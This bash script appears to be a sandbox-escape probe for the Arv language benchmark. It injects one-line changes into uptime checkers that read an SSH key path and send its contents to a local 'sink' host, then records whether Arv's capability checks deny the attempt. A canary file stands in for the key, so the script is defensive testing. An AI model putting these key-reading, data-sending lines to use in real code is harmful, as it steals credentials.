#!/usr/bin/env bash
# Phase 5 gate security probe. Each uptime checker gets a one-line change
# that tries to read ~/.ssh/id_ed25519 and send it to a host that is not
# in the target list; both then run exactly as bench/run.sh runs them
# (the Arv version with the same --allow flags). HOME is a temp dir whose
# .ssh/id_ed25519 holds a canary: the real key is never read. The "other
# host" is a second farm on another loopback port; its /sink counts what
# arrives.
#
#   bench/escape/probe.sh            # results in bench/out/escape/
#
# Arv has no POST, so its probe sends the key in a GET query string.
set -euo pipefail

REPO=$(cd "$(dirname "$0")/../.." && pwd)
OUT=${BENCH_OUT:-$REPO/bench/out}
mkdir -p "$OUT"
OUT=$(cd "$OUT" && pwd)
BIN=$OUT/bin
E=$OUT/escape
rm -rf "$E"
mkdir -p "$BIN" "$E/home/.ssh" "$E/work/out" "$E/go"

(cd "$REPO" && go build -o "$BIN/arv" ./cmd/arv && go build -o "$BIN/farm" ./bench/farm/cmd/farm)

CANARY="ARV-ESCAPE-CANARY-$$-$RANDOM"
printf '%s' "$CANARY" >"$E/home/.ssh/id_ed25519"
chmod 600 "$E/home/.ssh/id_ed25519"
KEY=$E/home/.ssh/id_ed25519

PIDS=()
trap 'kill "${PIDS[@]}" 2>/dev/null || true' EXIT
# start NAME FLAGS...: a farm whose base URL lands in $E/NAME.url.
start() {
	local name=$1
	shift
	"$BIN/farm" "$@" >"$E/$name.url" 2>"$E/$name.err" &
	PIDS+=($!)
	for _ in $(seq 300); do
		[ -s "$E/$name.url" ] && return
		sleep 0.1
	done
	echo "probe.sh: farm $name did not start" >&2
	exit 1
}
start farm -targets "$E/work/targets.txt" -latency 5ms-40ms
start sink -n 1
FARM=$(head -1 "$E/farm.url")
SINK=$(head -1 "$E/sink.url")

# insert AFTER_PREFIX LINE SRC DST: DST is SRC with LINE added after the
# first line that starts with AFTER_PREFIX (leading spaces ignored).
insert() {
	AFTER=$1 LINE=$2 awk '{ print } !done { s = $0; sub(/^[ \t]+/, "", s); if (index(s, ENVIRON["AFTER"]) == 1) { print ENVIRON["LINE"]; done = 1 } }' "$3" >"$4"
	[ "$(wc -l <"$4")" -eq $(($(wc -l <"$3") + 1)) ] || { echo "probe.sh: '$1' not found in $3" >&2; exit 1; }
}

# The Arv probes, in the root task, which holds the most authority.
insert "let urls =" "http_get(\"$SINK/sink?key=\" + read_file(\"$KEY\"));" "$REPO/examples/uptime.arv" "$E/arv-read-and-send.arv"
insert "let urls =" "http_get(\"$SINK/sink?key=stolen\");" "$REPO/examples/uptime.arv" "$E/arv-send-only.arv"
# The Go probe: the same module, with one line added and the replace
# path made absolute so it builds outside the repo.
cp "$REPO/bench/uptime-go/go.mod" "$REPO/bench/uptime-go/go.sum" "$E/go/"
(cd "$E/go" && go mod edit -replace "github.com/delavalom/arvlang=$REPO")
insert "urls := strings.Fields" "	if key, err := os.ReadFile(os.Getenv(\"HOME\") + \"/.ssh/id_ed25519\"); err == nil { http.Post(\"$SINK/sink\", \"text/plain\", strings.NewReader(string(key))) }" "$REPO/bench/uptime-go/main.go" "$E/go/main.go"
(cd "$E/go" && go build -o "$BIN/uptime-go-escape" .)

# probe NAME CMD...: run with HOME pointing at the canary, then report.
probe() {
	local name=$1
	shift
	curl -fsS -X POST "$FARM/reset" >/dev/null
	curl -fsS -X POST "$SINK/reset" >/dev/null
	local code=0
	(cd "$E/work" && HOME="$E/home" "$@" >"$E/$name.stdout" 2>"$E/$name.stderr") || code=$?
	local stats sink bytes denied=no
	stats=$(curl -fsS "$SINK/stats")
	sink=$(echo "$stats" | sed -E 's/.*"sink":([0-9]+).*/\1/')
	bytes=$(echo "$stats" | sed -E 's/.*"sink_bytes":([0-9]+).*/\1/')
	grep -q "capability denied" "$E/$name.stderr" && denied=yes
	echo "$name: exit $code, capability denied: $denied, sink requests: $sink, sink bytes: $bytes" | tee -a "$E/summary.txt"
	sed 's/^/  stderr: /' "$E/$name.stderr" | head -3 | tee -a "$E/summary.txt"
}
ALLOW=(--allow fs_read=targets.txt --allow fs_write=out --allow "net=${FARM#http://}")
probe arv-read-and-send "$BIN/arv" run "${ALLOW[@]}" "$E/arv-read-and-send.arv"
probe arv-send-only "$BIN/arv" run "${ALLOW[@]}" "$E/arv-send-only.arv"
probe go-read-and-send "$BIN/uptime-go-escape"
echo "canary: ${#CANARY} bytes; results: $E/summary.txt"
